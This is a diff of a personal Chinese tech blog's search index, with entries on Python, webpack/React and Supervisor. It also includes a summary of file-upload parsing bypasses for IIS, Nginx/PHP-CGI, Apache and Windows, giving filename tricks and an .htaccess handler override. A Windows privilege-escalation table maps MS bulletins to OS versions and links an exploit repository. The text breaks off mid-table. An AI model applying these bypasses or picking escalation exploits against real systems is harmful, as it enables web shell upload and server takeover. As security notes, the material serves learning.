+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">'GET: %s'</span> % url)</span><br><span class="line">    resp = request.urlopen(url)</span><br><span class="line">    data = resp.read()</span><br><span class="line">    print(<span class="string">'%d bytes received from %s.'</span> % (len(data), url))</span><br><span class="line"></span><br><span class="line">gevent.joinall([</span><br><span class="line">        gevent.spawn(f, <span class="string">'https://github.com/'</span>),</span><br><span class="line">        gevent.spawn(f, <span class="string">'https://www.baidu.com/'</span>),</span><br><span class="line">        gevent.spawn(f, <span class="string">' https://www.python.org/'</span>),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>WEB前端/后端</category>
       </categories>
   </entry>
   <entry>
-    <title><![CDATA[web容器上传文件利用方式总结]]></title>
-    <url>%2F2018%2F06%2F22%2Fweb-e5-ae-b9-e5-99-a8-e4-b8-8a-e4-bc-a0-e6-96-87-e4-bb-b6-e5-88-a9-e7-94-a8-e6-96-b9-e5-bc-8f-e6-80-bb-e7-bb-93%2F</url>
-    <content type="text"><![CDATA[1.IIS 6.0 在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。 /1.asp/1.jpg 分号后面的不被解析 1.asp;.jpg IIS6.0 默认的可执行文件除了asp还包含asa,cer,cdx 2.IIS写权限 用curl -i -X OPTIONS www.example.com 测试是否支持PUT 3.php CGI解析漏洞(nginx/ii7.0/iis7.5等)在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。 1.jpg/xxx.php可以执行 4.Nginx空字节代码执行(php)漏洞Ngnix在遇到%00空字节时与后端FastCGI处理不一致 nginx 0.5. nginx 0.6. nginx 0.7 &lt;= 0.7.65 nginx 0.8 &lt;= 0.8.37 1.jpg%00.php可执行 5.Apache(1.x/2.x)解析漏洞 Apache在解析文件时有一个原则：当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 1.php.xxx可执行 上传.htaccess,使jpg可执行 SetHandler application/x-httpd-php 6.Windows在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 可以通过1.php. , 1.php[空格]绕过黑名单]]></content>
+    <title> Python3 MRO与super		</title>
+    <url>/2019/02/19/python-mro-e4-b8-8esuper/</url>
+    <content><![CDATA[<h3 id="0x1-MRO"><a href="#0x1-MRO" class="headerlink" title="0x1 MRO"></a>0x1 MRO</h3><ul>
+<li><p>二义性问题：派生类与基类中存在名字相同的数据或函数，使得无法判断与调用。例如，有两个基类A和B，A和B都定义了方法f()，C继承A和B，那么调用C的f()方法时会出现不确定。</p>
+</li>
+<li><p>MRO：method resolution order（方法解释顺序），主要用于在多继承时判断属性(成员变量/方法)的搜索顺序，解决二义性问题。通过拓扑排序实现。可通过内置<code>__mro__</code>或者<code>mro()</code>查看类的mro列表。</p>
+</li>
+<li><p>拓扑排序：对一个有向无环图G进行拓扑排序，是将G中所有顶点排成一个线性序列，使得图中任意一对顶点u和v，若边(u,v)∈E(G)，则u在线性序列中出现在v之前。<code>实现步骤：选择一个入度为0的顶点并输出；从图中删除此顶点及所有出边。</code></p>
+<a id="more"></a>
+<p><a href="https://imgchr.com/i/kgh49U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/19/kgh49U.md.jpg" alt="kgh49U.md.jpg"></a></p>
+</li>
+</ul>
+<p>此为一个多重继承关系图，首先选入度为0的元素A,再删除从A出去的边，此时B，C都是入度为0，从左到右选择，所以选择B并删除B的边,再接着就是E,C,D,F,最后是object,所以A的MRO列表为<code>[A,B,E,C,D,F,object]</code></p>
+<h3 id="0x2-super的两种调用方式"><a href="#0x2-super的两种调用方式" class="headerlink" title="0x2 super的两种调用方式"></a>0x2 super的两种调用方式</h3><blockquote>
+<p>提供一个MRO以及一个MRO中的类C, super()将返回一个从MRO中C之后的类中查找方法的对象。</p>
+</blockquote>
+<ul>
+<li><code>super(a_type, obj).func()</code>,此时func是与obj绑定的,MRO 指的是 type(obj) 的 MRO, MRO 中的那个类就是 a_type , 同时 isinstance(obj, a_type) == True 。</li>
+<li><code>super(type1, type2).func()</code>,此时func未绑定,MRO 指的是 type2 的 MRO, MRO 中的那个类就是 type1 ，同时 issubclass(type2, type1) == True 。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>webpack构建react项目</title>
+    <url>/2020/08/10/webapck%E6%9E%84%E5%BB%BAreact/</url>
+    <content><![CDATA[<h4 id="1-创建基本项目结构"><a href="#1-创建基本项目结构" class="headerlink" title="1.创建基本项目结构"></a>1.创建基本项目结构</h4><p>安装react typescript</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add react react-dom</span><br><span class="line"></span><br><span class="line">yarn add -D @types/react @types/react-dom</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add typescript -D</span><br></pre></td></tr></table></figure>
+<p>配置typescript</p>
+<p>tsconfig.json</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"compilerOptions"</span>: &#123;</span><br><span class="line">        <span class="string">"jsx"</span>: <span class="string">"react"</span>, <span class="comment">//在tsx里面支持jsx</span></span><br><span class="line">        <span class="string">"isolatedModules"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"esModuleInterop"</span>:<span class="literal">true</span>, </span><br><span class="line">        <span class="comment">//允许从没有设置默认导出的模块中默认导入 import * as fs from 'fs' 等于 import fs from 'fs'</span></span><br><span class="line">        <span class="string">"strict"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">"baseUrl"</span>:<span class="string">"./"</span>, <span class="comment">//解析非相对模块名的基准目录</span></span><br><span class="line">        <span class="string">"paths"</span>: &#123;</span><br><span class="line">            <span class="comment">// 配置模块路径映射</span></span><br><span class="line">            <span class="string">"@/*"</span>: [<span class="string">"./src/*"</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"skipLibCheck"</span>:<span class="literal">true</span>,<span class="comment">//忽略所有的声明文件（ *.d.ts）的类型检查</span></span><br><span class="line">        <span class="comment">// 下面这些选项对 babel 编译 TypeScript 没有作用但是可以让 VSCode 等编辑器正确提示错误</span></span><br><span class="line">        <span class="string">"target"</span>: <span class="string">"ES2019"</span>,</span><br><span class="line">        <span class="string">"module"</span>: <span class="string">"ESNext"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"include"</span>: [</span><br><span class="line">        <span class="string">"./src/**/*"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>src/App.tsx</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &apos;react&apos;;</span><br><span class="line"></span><br><span class="line">const App = React.memo(()=&gt;&#123;</span><br><span class="line">    return (</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            hello world</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">export default App;</span><br></pre></td></tr></table></figure>
+<p>src/index.tsx</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &apos;react&apos;;</span><br><span class="line">import ReactDOM from &apos;react-dom&apos;;</span><br><span class="line">import App from &apos;./App&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ReactDOM.render(</span><br><span class="line">    &lt;App/&gt;,</span><br><span class="line">    document.getElementById(&apos;app&apos;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>public/index.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"root"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="2-编译tsx打包"><a href="#2-编译tsx打包" class="headerlink" title="2.编译tsx打包"></a>2.编译tsx打包</h4><p>安装webpack</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add -D webpack webpack-cli</span><br></pre></td></tr></table></figure>
+<p>安装babel编译ts,jsx</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add babel-loader @babel/core @babel/preset-typescript @babel/preset-react -D</span><br></pre></td></tr></table></figure>
+<p>babel.config.json</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"presets"</span>:[</span><br><span class="line">      <span class="string">"@babel/preset-react"</span>,</span><br><span class="line">      <span class="string">"@babel/preset-typescript"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>webpack 添加babel-loder</p>
+<p>webpack.dev.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    mode: <span class="string">"development"</span>,</span><br><span class="line">    devtool: <span class="string">"inline-source-map"</span>,</span><br><span class="line">    entry: <span class="string">'./src/index.tsx'</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        publicPath:<span class="string">'./public'</span>,</span><br><span class="line">        filename: <span class="string">'[name].js'</span>,</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">'./dist'</span>),</span><br><span class="line">    &#125;,</span><br><span class="line">    resolve: &#123;</span><br><span class="line">        <span class="comment">// 导入ts 等模块一般不写后缀名，webpack 会尝试使用这个数组提供的后缀名去导入</span></span><br><span class="line">        extensions: [<span class="string">'.ts'</span>, <span class="string">'.tsx'</span>, <span class="string">'.js'</span>, <span class="string">'.json'</span>],</span><br><span class="line">        alias:&#123;</span><br><span class="line">            <span class="string">"@"</span>: path.resolve(__dirname, <span class="string">'src/'</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">          &#123;</span><br><span class="line">            test: <span class="regexp">/\.(tsx?|js)$/</span>,</span><br><span class="line">            loader: <span class="string">'babel-loader'</span>,</span><br><span class="line">            options: &#123; <span class="attr">cacheDirectory</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">            include: [</span><br><span class="line">                path.resolve(__dirname, <span class="string">"src"</span>)</span><br><span class="line">            ],</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="3-webpack-dev-server"><a href="#3-webpack-dev-server" class="headerlink" title="3.webpack-dev-server"></a>3.webpack-dev-server</h4><p>每次都要webpack打包，刷新浏览器很麻烦，通过webpack-dev-server本地开启一个server，文件变更后自动编译更新。webpack-dev-server打包后的文件在内存中并没有实际的文件。打包后的文件访问通过output.publicPath控制，默认是根目录，也就是dev server的根目录</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add -D webpack-dev-server</span><br></pre></td></tr></table></figure>
+<p>package.json scripts</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"build"</span>: <span class="string">"webpack --config webpack.dev.js"</span>,</span><br><span class="line">    <span class="attr">"dev"</span>: <span class="string">"webpack-dev-server --config webpack.dev.js --open --hot"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="4-使用html-webpack-plugin自动插入bundle-js"><a href="#4-使用html-webpack-plugin自动插入bundle-js" class="headerlink" title="4.使用html-webpack-plugin自动插入bundle.js"></a>4.使用html-webpack-plugin自动插入bundle.js</h4><p>可以根据模版文件，插入bundle.js后生成新的文件</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yarn add html-webpack-plugin -D</span><br></pre></td></tr></table></figure>
+<p>webpack.dev.js</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  plugins: [</span><br><span class="line">        new HtmlWebpackPlugin(&#123;</span><br><span class="line">          template: './public/index.html'  // 在  output.path 目录下生成文件</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="5-eslint-代码风格"><a href="#5-eslint-代码风格" class="headerlink" title="5.eslint 代码风格"></a>5.eslint 代码风格</h4><p>.eslintrc.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    root: <span class="literal">true</span>,</span><br><span class="line">    parser: <span class="string">'@typescript-eslint/parser'</span>,</span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="string">'@typescript-eslint'</span>,</span><br><span class="line">    ],</span><br><span class="line">    extends: [</span><br><span class="line">      <span class="string">'eslint:recommended'</span>,</span><br><span class="line">      <span class="string">'plugin:@typescript-eslint/recommended'</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><code>yarn eslint ./src --ext .ts,.tsx</code></p>
+]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+      <tags>
+        <tag>webpack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title> Python3 生成器		</title>
+    <url>/2019/02/24/python3-e7-94-9f-e6-88-90-e5-99-a8/</url>
+    <content><![CDATA[<blockquote>
+<p>在 Python 中，使用了<code>yield</code>的函数被称为生成器（generator）。在通过<code>__next__()</code> 调用生成器时，会执行到下一个yield停止，返回 yield 的值，在下一次执行 <code>__next__()</code> 方法时从当前位置继续运行，没有下一个yield时抛出<code>StopIteration</code>的异常。生成器可以用for循环迭代。</p>
+</blockquote>
+<h3 id="1-列表生成式"><a href="#1-列表生成式" class="headerlink" title="1.列表生成式"></a>1.列表生成式</h3><blockquote>
+<p>将列表生成式的<code>[]</code>改成<code>()</code>，就创建了一个生成器</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L = [x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>L</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g = (x * x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g</span><br><span class="line">&lt;generator object &lt;genexpr&gt; at <span class="number">0x104feab40</span>&gt;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h3 id="2-函数"><a href="#2-函数" class="headerlink" title="2.函数"></a>2.函数</h3><blockquote>
+<p>含有<code>yield</code>关键字的函数被认为是生成器。</p>
+</blockquote>
+<p>斐波拉契数列：</p>
+<pre><code>
+def fib(max):
+    n, a, b = 0, 0, 1
+    while n < max:
+        yield b
+        a, b = b, a + b
+        n = n + 1
+</code></pre>
+
+
+<h3 id="3-next-and-send"><a href="#3-next-and-send" class="headerlink" title="3.___next__() and send()"></a>3.<code>___next__()</code> and <code>send()</code></h3><ul>
+<li><code>___next__()</code>，执行到下一个yield处，并返回值，</li>
+<li><code>send(val)</code>，执行到下一个yield处，并返回值，val可以设置上一个yield表达式的返回值<code>(m= yield 5)</code>，yield 5这个表达式是没有返回值的，所以m=None，但是<code>send(val)</code>可以设置m=val，第一次运行next时在yield处返回，m没有被赋值，第二次执行send(val)时，从此处接着执行，设置m=val，并运行到下一个yield处</li>
+<li><code>___next__()</code> == <code>send(None)</code></li>
+</ul>
+<blockquote>
+<p>生产者消费者问题：生产者生产-&gt;消费者消费-&gt;生产者生产…</p>
+</blockquote>
+<pre><code>
+def consumer():
+    r = ''
+    while True:
+        n = yield r
+        if not n:
+            return
+        print('[CONSUMER] Consuming %s...' % n)
+        r = '200 OK'
+
+def produce(c):
+    c.send(None)
+    n = 0
+    while n < 5:
+        n = n + 1
+        print('[PRODUCER] Producing %s...' % n)
+        r = c.send(n)
+        print('[PRODUCER] Consumer return: %s' % r)
+    c.close()
+
+c = consumer()
+produce(c)
+</code></pre>   
+
+
+<p>结果:</p>
+<p><pre><code><br>[PRODUCER] Producing 1…<br>[CONSUMER] Consuming 1…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 2…<br>[CONSUMER] Consuming 2…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 3…<br>[CONSUMER] Consuming 3…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 4…<br>[CONSUMER] Consuming 4…<br>[PRODUCER] Consumer return: 200 OK<br>[PRODUCER] Producing 5…<br>[CONSUMER] Consuming 5…<br>[PRODUCER] Consumer return: 200 OK</code></pre></p>
+<p><pre><code></code></pre></p>
+]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> Supervisor		</title>
+    <url>/2018/10/20/supervisor/</url>
+    <content><![CDATA[<blockquote>
+<p>Supervisor是一个linux进程控制系统,让后台进程在会话结束的时候也照常运行，比如运行python flask应用</p>
+</blockquote>
+<h3 id="1-配置文件"><a href="#1-配置文件" class="headerlink" title="1.配置文件"></a>1.配置文件</h3><p><code>apt-get install supervisor</code>安装完后，默认配置文件在<code>/etc/supervisor/supervisord.conf</code> <code>echo_supervisord_conf</code> 可以看到示例配置文件</p>
+<pre><code>[include]
+files = /etc/supervisor/conf.d/*.conf #该目录下增加我们自己的配置文件，在该配置文件中增加[program:x]部分，用来运行我们自己的程序
+</code></pre><a id="more"></a>
+<h3 id="2-进程管理配置文件"><a href="#2-进程管理配置文件" class="headerlink" title="2.进程管理配置文件"></a>2.进程管理配置文件</h3><pre><code>；/etc/supervisor/conf.d/test.conf 
+[program:x] ;x是program名称
+command =python test.py ;包含一个命令，当这个program启动时执行
+directory = /home/si/ ;执行子进程时supervisord暂时切换到该目录
+user = si ;用户
+startsecs = 3 ;进程从STARING状态转换到RUNNING状态program所需要保持运行的时间
+stdout_logfile_maxbytes = 50MB ;stdout_logfile指定日志文件最大字节数，默认为50MB，可以加KB、MB或GB等单位
+stdout_logfile_backups = 10 ;要保存的stdout_logfile备份的数量
+stdout_logfile = /home/si/1.log ;将进程stdout输出到指定文件
+redirect_stderr=true ; 如果为true，则stderr的日志会被写入stdout日志文件中
+
+numprocs=1 ; 启动进程的数目
+autostart=true ; 如果是true的话，子进程将在supervisord启动后被自动启动
+autorestart=unexpected  ; 这个是设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected 和true。 如果为unexpected，只有当进程的退出码不在exitcodes里面定义的退 出码的时候，才会被自动重启。
+exitcodes=0,2
+startretries=3 ; 当进程启动失败后，最大尝试启动的次数
+</code></pre><h3 id="3-启动"><a href="#3-启动" class="headerlink" title="3.启动"></a>3.启动</h3><pre><code>supervisord #启动supervisor服务端
+
+#客户端
+supervisorctl  status #查看状态
+supervisorctl  reload #重新载入配置文件 
+supervisorctl  start [all]|[name] #启动所有/指定的程序进程 
+supervisorctl  stop [all]|[name] #关闭所有/指定的程序进程
+</code></pre>]]></content>
+      <categories>
+        <category>WEB前端/后端</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> web容器上传文件利用方式总结		</title>
+    <url>/2018/06/22/web-e5-ae-b9-e5-99-a8-e4-b8-8a-e4-bc-a0-e6-96-87-e4-bb-b6-e5-88-a9-e7-94-a8-e6-96-b9-e5-bc-8f-e6-80-bb-e7-bb-93/</url>
+    <content><![CDATA[<h2 id="1-IIS-6-0"><a href="#1-IIS-6-0" class="headerlink" title="1.IIS 6.0"></a>1.IIS 6.0</h2><ul>
+<li><p>在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。 /1.asp/1.jpg </p>
+</li>
+<li><p>分号后面的不被解析  1.asp;.jpg </p>
+</li>
+<li><p>IIS6.0 默认的可执行文件除了asp还包含asa,cer,cdx  </p>
+<a id="more"></a>
+<p>2.IIS写权限</p>
+</li>
+</ul>
+<hr>
+<p>用curl  -i  -X  OPTIONS  <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 测试是否支持PUT  </p>
+<h2 id="3-php-CGI解析漏洞-nginx-ii7-0-iis7-5等"><a href="#3-php-CGI解析漏洞-nginx-ii7-0-iis7-5等" class="headerlink" title="3.php CGI解析漏洞(nginx/ii7.0/iis7.5等)"></a>3.php CGI解析漏洞(nginx/ii7.0/iis7.5等)</h2><p>在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo，默认是开启的，当URL中有不存在的文件，PHP就会向前递归解析。 1.jpg/xxx.php可以执行  </p>
+<h2 id="4-Nginx空字节代码执行-php-漏洞"><a href="#4-Nginx空字节代码执行-php-漏洞" class="headerlink" title="4.Nginx空字节代码执行(php)漏洞"></a>4.Nginx空字节代码执行(php)漏洞</h2><p>Ngnix在遇到%00空字节时与后端FastCGI处理不一致 nginx 0.5.<em> nginx 0.6.</em> nginx 0.7 &lt;= 0.7.65 nginx 0.8 &lt;= 0.8.37 1.jpg%00.php可执行  </p>
+<h2 id="5-Apache-1-x-2-x-解析漏洞"><a href="#5-Apache-1-x-2-x-解析漏洞" class="headerlink" title="5.Apache(1.x/2.x)解析漏洞"></a>5.Apache(1.x/2.x)解析漏洞</h2><ul>
+<li><p>Apache在解析文件时有一个原则：当碰到不认识的扩展名时，将会从后面向前解析，直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 1.php.xxx可执行 </p>
+</li>
+<li><p>上传.htaccess,使jpg可执行 <filesmatch *.jpg>SetHandler  application/x-httpd-php<filesmatch>  </filesmatch></filesmatch></p>
+</li>
+</ul>
+<h2 id="6-Windows"><a href="#6-Windows" class="headerlink" title="6.Windows"></a>6.Windows</h2><p>在windows环境下，<code>xx.jpg[空格]</code> 或<code>xx.jpg.</code> 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 可以通过1.php.  ,  1.php[空格]绕过黑名单</p>
+]]></content>
       <categories>
         <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title> windows提权对照表		</title>
+    <url>/2018/08/03/windows-e6-8f-90-e6-9d-83-e5-af-b9-e7-85-a7-e8-a1-a8/</url>
+    <content><![CDATA[<p><a href="https://github.com/SecWiki/windows-kernel-exploits" title="exp下载地址" target="_blank" rel="noopener"><font color="#F08080">exp下载地址</font></a></p>
+<a id="more"></a>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Security Bulletin   #KB     #Description    #Operating System</span></span><br><span class="line"> </span><br><span class="line">CVE<span class="number">-2017</span><span class="number">-0213</span> 　[Windows COM Elevation of Privilege Vulnerability]　　(windows <span class="number">10</span>/<span class="number">8.1</span>/<span class="number">7</span>/<span class="number">2016</span>/<span class="number">2010</span>/<span class="number">2008</span>)</span><br><span class="line">MS17<span class="number">-010</span> 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows <span class="number">7</span>/<span class="number">2008</span>/<span class="number">2003</span>/XP)</span><br><span class="line">MS16<span class="number">-135</span> 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(<span class="number">2016</span>)</span><br><span class="line">MS16<span class="number">-098</span> 　[KB3178466]　　[Kernel Driver]　　(Win <span class="number">8.1</span>)</span><br><span class="line">MS16<span class="number">-075</span> 　[KB3164038]　　[Hot Potato]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-032</span> 　[KB3143141]　　[Secondary Logon Handle]　　(<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">10</span>/<span class="number">2012</span>)</span><br><span class="line">MS16<span class="number">-016</span> 　[KB3136041]　　[WebDAV]　　(<span class="number">2008</span>/Vista/<span class="number">7</span>)</span><br><span class="line">MS15<span class="number">-097</span> 　[KB3089656]　　[remote code execution]　　(win8<span class="number">.1</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-076</span> 　[KB3067505]　　[RPC]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-077</span> 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/<span class="number">2000</span>/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-061</span> 　[KB3057839]　　[Kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-051</span> 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>/<span class="number">2012</span>)</span><br><span class="line">MS15<span class="number">-010</span> 　[KB3036220]　　[Kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS15<span class="number">-015</span> 　[KB3031432]　　[Kernel Driver]　　(Win7/<span class="number">8</span>/<span class="number">8.1</span>/<span class="number">2012</span>/RT/<span class="number">2012</span> R2/<span class="number">2008</span> R2)</span><br><span class="line">MS15<span class="number">-001</span> 　[KB3023266]　　[Kernel Driver]　　(<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-070</span> 　[KB2989935]　　[Kernel Driver]　　(<span class="number">2003</span>)</span><br><span class="line">MS14<span class="number">-068</span> 　[KB3011780]　　[Domain Privilege Escalation]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-058</span> 　[KB3000061]　　[Win32k.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-040</span> 　[KB2975684]　　[AFD Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>/<span class="number">8</span>)</span><br><span class="line">MS14<span class="number">-002</span> 　[KB2914368]　　[NDProxy]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS13<span class="number">-053</span> 　[KB2850851]　　[win32k.sys]　　(XP/Vista/<span class="number">2003</span>/<span class="number">2008</span>/win <span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-046</span> 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/<span class="number">7</span>)</span><br><span class="line">MS13<span class="number">-005</span> 　[KB2778930]　　[Kernel Mode Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">2012</span>/win7/<span class="number">8</span>)</span><br><span class="line">MS12<span class="number">-042</span> 　[KB2972621]　　[Service Bus]　　(<span class="number">2008</span>/<span class="number">2012</span>/win7)</span><br><span class="line">MS12<span class="number">-020</span> 　[KB2671387]　　[RDP]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-080</span> 　[KB2592799]　　[AFD.sys]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-062</span> 　[KB2566454]　　[NDISTAPI]　　(<span class="number">2003</span>/XP)</span><br><span class="line">MS11<span class="number">-046</span> 　[KB2503665]　　[AFD.sys]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span class="number">7</span>/XP)</span><br><span class="line">MS11<span class="number">-011</span> 　[KB2393802]　　[kernel Driver]　　(<span class="number">2003</span>/<span class="number">2008</span>/<span 